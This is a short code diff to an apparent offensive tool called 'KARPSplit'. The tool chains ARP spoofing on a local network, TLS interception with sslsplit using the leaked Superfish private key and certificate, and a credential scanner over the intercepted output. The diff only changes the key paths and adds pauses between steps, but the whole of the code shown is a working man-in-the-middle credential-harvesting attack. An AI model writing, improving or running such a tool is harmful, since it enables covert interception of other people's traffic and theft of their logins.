@@ -18,7 +18,7 @@ def arpspoof(target = None):
 
 
 def sslsplit():
-    splitter = subprocess.Popen(["sslsplit", "-k ~/superfishy-master/certificates/superfish-unprotected.key", "-c ~/superfishy-master/certificates/superfish.crt", "-L /dev/stdout" "ssl 0.0.0.0 8443"], stdout=PIPE)
+    splitter = subprocess.Popen(["sslsplit", "-k /root/superfishy-master/certificates/superfish-unprotected.key", "-c /root/superfishy-master/certificates/superfish.crt", "-L /dev/stdout" "ssl 0.0.0.0 8443"], stdout=PIPE)
     return splitter
 
 
@@ -54,7 +54,9 @@ def read_output(pipe):
 print("KARPSplit v0.1\n")
 print("Starting ARP Spoof...")
 arpspoof()
+time.sleep(1)
 print("Starting SSLSplit...")
 splitter = sslsplit()
+time.sleep(1)
 print("Starting credential scanner...")
 read_output(splitter.stdout)
